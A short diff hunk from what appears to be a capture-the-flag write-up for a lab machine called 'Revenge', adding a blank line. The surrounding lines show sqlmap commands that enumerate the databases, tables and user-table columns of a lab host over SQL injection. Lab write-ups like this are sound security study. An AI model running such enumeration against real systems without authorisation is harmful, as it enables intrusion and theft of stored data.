@@ -40,6 +40,7 @@ We can pull the database information `sqlmap -u http://10.10.90.135/products/1 -
 ![Revenge sqli dbs](revenge-sqlmap-dbs.png)
 
 listing available tables `sqlmap -u http://10.10.90.135/products/1 -D duckyinc --tables`:
+
 ![Revenge sqli tables](revenge-sqlmap-tables.png)
 
 listing available columns within the user table `sqlmap -u http://10.10.90.135/products/1 -D duckyinc -T user --columns`:
